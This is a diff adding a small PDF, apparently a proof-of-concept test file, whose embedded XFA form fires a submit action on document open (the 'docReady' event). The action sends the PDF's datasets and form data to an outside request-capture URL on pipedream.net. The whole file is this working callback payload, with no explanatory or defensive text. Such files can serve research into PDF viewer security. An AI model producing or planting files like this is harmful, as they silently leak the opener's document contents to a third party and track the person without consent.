@@ -1,0 +1,40 @@
+%PDF-1
+1 0 obj <<>>
+stream
+<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
+<config><present><pdf>
+    <interactive>1</interactive>
+</pdf></present></config>
+<template>
+    <subform name="_">
+        <pageSet/>
+        <field id="Hello World!">
+            <event activity="docReady" ref="$host" name="event__click">
+               <submit
+                     textEncoding="UTF-16"
+                     xdpContent="pdf datasets xfdf"
+                     target="https://enmrdee785hri.x.pipedream.net/"/>
+            </event>
+</field>
+    </subform>
+</template>
+</xdp:xdp>
+endstream
+endobj
+trailer <<
+    /Root <<
+        /AcroForm <<
+            /Fields [<<
+                /T (0)
+                /Kids [<<
+                    /Subtype /Widget
+                    /Rect []
+                    /T ()
+                    /FT /Btn
+                >>]
+            >>]
+            /XFA 1 0 R
+        >>
+        /Pages <<>>
+    >>
+>>
